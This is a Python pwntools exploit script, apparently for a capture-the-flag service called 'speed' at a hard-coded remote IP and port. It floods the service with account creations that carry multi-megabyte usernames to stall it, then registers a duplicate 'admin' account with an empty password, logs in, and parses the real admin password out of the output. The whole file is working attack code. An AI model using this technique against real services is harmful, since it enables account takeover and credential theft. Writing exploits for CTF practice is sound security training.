#!/usr/bin/env python3
from pwn import *
import re, socket, time

BIN   = "./speed"
HOST  = "157.245.146.21"
PORT  = 9992

ACCOUNT_NAME_LEN = 4194304
BIG_SPACES_LEN   = ACCOUNT_NAME_LEN - 1
STALL_COUNT      = 12                # <-- try 12â€“16 on remote
CHUNK_SIZE       = 262144            # 256 KiB
READ_WINDOW      = 10.0              # seconds

def build_firehose():
    big = b" " * BIG_SPACES_LEN
    buf = bytearray()
    for _ in range(STALL_COUNT):
        buf += b"3\n"      # Create account
        buf += big         # huge username (no newline)
        buf += b"lmao\n"   # password for that account
    # duplicate admin with empty pw, login, print, exit
    buf += b"3\nadmin\n\n2\nadmin\n\n4\n5\n"
    return bytes(buf)

def send_chunked(io, data, chunk=CHUNK_SIZE, pause=0.0):
    for i in range(0, len(data), chunk):
        io.send(data[i:i+chunk])
        if pause:
            time.sleep(pause)

def run(io):
    firehose = build_firehose()
    # chunked send is friendlier to remote sockets
    send_chunked(io, firehose)
    out = io.recvrepeat(READ_WINDOW)

    m = re.search(rb"Username:\s*admin,.*?Password:\s*(.*?),\s*\}", out, re.S)
    if m:
        leaked = m.group(1).decode(errors="ignore")
        log.success(f"Leaked admin password: {leaked!r}")
    else:
        log.warning("No leak parsed; dumping tail")
        print(out[-3000:].decode(errors="ignore"))

if __name__ == "__main__":
    context.binary = ELF(BIN, checksec=False)
    context.log_level = "info"

    io = remote(HOST, PORT, ssl=False, timeout=30.0)
    try:
        # push bytes ASAP over high-RTT links
        try: io.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except: pass
        run(io)
    finally:
        io.close()
